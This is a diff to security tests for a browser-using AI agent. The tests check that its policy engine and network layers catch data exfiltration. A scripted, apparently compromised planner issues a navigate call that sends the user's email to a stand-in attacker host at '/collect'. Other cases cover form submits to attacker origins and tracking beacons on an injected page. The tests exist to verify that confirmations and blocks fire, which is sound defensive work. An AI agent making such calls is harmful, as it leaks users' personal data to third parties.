@@ -78,10 +78,12 @@ test('form-fill exfiltration: submit to attacker origin is confirmed and denied'
   expect(await waitDone(a.ui)).toBe('finished');
   expect(fx.attackerHits).toHaveLength(0);
   const c = confirmations(a);
-  expect(c).toHaveLength(1);
-  expect(c[0].destination).toBe(`${fx.attacker}/collect`);
-  expect(c[0].reasons.join(' ')).toMatch(/submits a form/);
-  expect(c[0].reasons.join(' ')).toMatch(/new origin/);
+  // typing the task's email into a form that posts elsewhere is confirmed first, then the submit
+  expect(c).toHaveLength(2);
+  expect(c[0].reasons.join(' ')).toMatch(/email from your task into a site your task did not name/);
+  expect(c[1].destination).toBe(`${fx.attacker}/collect`);
+  expect(c[1].reasons.join(' ')).toMatch(/submits a form/);
+  expect(c[1].reasons.join(' ')).toMatch(/new origin/);
 });
 
 test('typing reader-extracted (untrusted) data into a form requires confirmation', async () => {
@@ -177,16 +179,18 @@ test('(a) policy engine DISABLED: compromised planner navigates to attacker, egr
     { tool: 'navigate', args: { url: `${fx.attacker}/collect?email=${encodeURIComponent(USER_EMAIL)}` } },
     { tool: 'finish', args: { answer: 'done' } },
   ));
-  a = await launch({ llmUrl: mock.url, policyDisabled: true });
+  a = await launch({ llmUrl: mock.url, policyDisabled: true, confirmTimeoutMs: 1500 });
   await expect(a.ui.locator('[data-testid=policy-disabled]')).toBeVisible();
   await runTask(a.ui, `My email is ${USER_EMAIL}. What deals are on ${fx.site}/beacon-exfil.html ?`);
   expect(await waitDone(a.ui)).toBe('finished');
   expect(confirmations(a)).toHaveLength(0); // nothing asked: policy really is off
   expect(a.audit().find((e) => e.type === 'task-start')?.policyDisabled).toBe(true);
   expect(fx.attackerHits).toHaveLength(0);
-  const blocked = a.audit().filter((e) => e.type === 'egress' && e.layer === 'proxy' && e.decision === 'block');
-  expect(blocked.some((b) => String(b.url ?? '').includes('/collect?email='))).toBe(true);
-  expect(blocked.some((b) => String(b.url ?? '').includes('/beacon-'))).toBe(true);
+  const blocked = a.audit().filter((e) => e.type === 'egress' && e.decision === 'block');
+  // the navigation carries the task's email: the webRequest content filter stops it (not confirmed);
+  // had it not, the proxy host allowlist would have. The page's beacons are stopped by the proxy.
+  expect(blocked.some((b) => String(b.url ?? '').includes('/collect?email=') && (b.layer === 'webrequest' || b.layer === 'proxy'))).toBe(true);
+  expect(blocked.some((b) => b.layer === 'proxy' && String(b.url ?? '').includes('/beacon-'))).toBe(true);
 });
 
 test('(b) tainted value in a same-origin navigation URL: blocked by the webRequest layer, allowed after approval', async () => {
